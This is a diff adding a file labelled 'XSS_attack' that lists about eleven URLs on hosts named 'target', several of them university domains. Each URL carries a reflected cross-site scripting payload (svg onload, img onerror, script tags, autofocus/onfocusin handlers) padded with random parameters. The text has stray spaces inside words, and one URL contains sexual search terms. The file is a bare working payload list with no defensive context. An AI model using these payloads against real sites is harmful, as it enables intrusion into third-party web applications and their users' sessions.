@@ -1,0 +1,34 @@
+
+--------------------------XSS_attack--------------------------------------
+
+
+https://target.com/watch?v=">K='><Svg/OnLoad=(confirm) (1)>&a=d 8d06&action=sjrs0&api_key=aoo05&c=d90a1
+
+https://target.com/search/top-rated/p*** x** sex video old
+age
+young/?q='|| alert (1) || ' &POST=v1sq0&black=tzub9&callback=ma15
+4&clicks=pxaw9
+
+https://www.target.com/en/accommodation-Biarritz/110m2-Pr ivate-room-in-a-flatshare-for-2-people/property/68351301-723 c-43c6-bd7a-0eecce86fc92?m=</script><script>confirm(1)</scri pt>&action=czwf3&cat=ot8y0&contact[duration]=s5au6&contact[u ser] [utmSource]=smuw3
+
+
+
+https://eco.target.pt/2021/10/28/wharton-planeia-aceitar-cript omoeda-como-propina-em-curso-de-blockchain/?s='"<B><Img/src/OnError=(confirm) (1)//>&api_key=ffs70&c=pq3k7&callback=xm5v0 &code=cj4x2
+
+https://www.target.com/2014/07/08/british-medical-ass ociation-prohibitionists-from-the-start/?s=') "AutoFocus/Cont entEditable/OnFocusIn=(confirm)(1)//&action=kjlf2&api=vxfj9& begindate=yg7r6&cat=10t11
+
+https://target.edu.sy/eng/index.php?act=") 'AutoFocus/Content Editable/OnFocusIn=(confirm) (1)//&a=zj4z4&action=i8fp5&api=W nt55&begindate=onyb0
+
+
+https://target.edu.iq/web_page.php?id_dept=1')"Auto Focus/ContentEditable/OnFocusIn=(confirm) (1)//&Logo=q7z21&ac tion=i8gs9&api_key=j5im1&callback=ajkc5
+
+
+
+https://www.target.am/?q='"><svg/onload=confirm('xss')>
+
+
+https://target.edu.vn/admin/index.php?com='; alert('OPENBUGBOUNTY'); var abc='&act=login
+
+
+
+https://target.ativ.me/web/planner.php?id=1')"AutoFocus/Con tentEditable/OnFocusIn=(confirm) (1)//&10=ekgn2&2000=okml0&50 0=snfg1&api=w2c30
